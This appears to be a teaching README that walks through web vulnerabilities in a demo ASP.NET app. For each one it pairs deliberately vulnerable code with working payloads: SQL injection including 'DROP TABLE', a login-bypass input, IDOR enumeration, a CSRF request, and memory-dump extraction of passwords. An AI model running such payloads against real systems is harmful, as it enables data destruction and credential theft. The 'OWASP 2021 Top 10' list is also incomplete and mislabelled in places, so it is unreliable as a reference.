# OWASP 2021 Top 10 Vulnerabilities

## 1. SQL Injection
```csharp
var products = _context.Products
                .FromSqlRaw($"SELECT * FROM Products WHERE Name LIKE '%{query}%'")
                .ToList();
```
Payload examples:
```
%' OR '1'='1'; -- 
%'; DROP TABLE Products; --
%'; DROP TABLE Products; --
```

## 2. Identification and Authentication Failures
```sql
SELECT * FROM Users WHERE Username = '{1}' AND Password = '{2}'
```
Bypass example:
```json
data = {
    "Username": "admin",
    "Password": "' OR '1'='1"
}
```

## 3. Cryptographic Failures
```csharp
user.Password = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(user.Password));
```
If the database is leaked:
```python
for enc in user.Password:
    print(base64.b64decode(enc))
```

## 4. Insecure Direct Object References (IDOR)
```csharp
var product = _context.Products.Find(id);
```
Exploit example:
```python
for i in range(100):
    req = request.get(url + "/Home/ProductDetails/" + str(i))
    print(req.text)
```

## 5. Insecure Design
```csharp
[HttpPost]
public IActionResult AddToCart(int id)
{
    return RedirectToAction("Index");
}
```
Vulnerable to CSRF:
```javascript
fetch("http://localhost:5057/Home/AddToCart", {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({ id: "1" })
});
```

## 6. Security Misconfiguration
Printing detailed error messages to the frontend:
```
MySqlException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--%'' at line 1
```
Example stack trace:
```
MySqlConnector.Core.ResultSet.ReadResultSetHeaderAsync(IOBehavior ioBehavior) in ResultSet.cs
MySqlConnector.MySqlDataReader.ActivateResultSet(CancellationToken cancellationToken) in MySqlDataReader.cs
...
Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddleware.Invoke(HttpContext context)
```

## 7. Insecure Binder Configuration
Adding bill data via POST registry.

## 8. Heap Inspection
Collecting a memory dump:
```sh
dotnet-dump collect -p <app-pid>
```
Opening it with WinDbg:
```sh
1. .load C:\Windows\Microsoft.NET\Framework\v4.0.30319\SOS.dll
2. !dumpheap -type System.String
3. .logopen /t c:\path\to\your\file.txt
4. .foreach (obj {!dumpheap -mt <MT of System.String>}) { .printf "\n\nObject: ${obj}\n"; !do ${obj} }
5. .logclose
```
Extracted sensitive data example:
```
Object: 01a2de580e80
Name:        System.String
String:      pass123
```
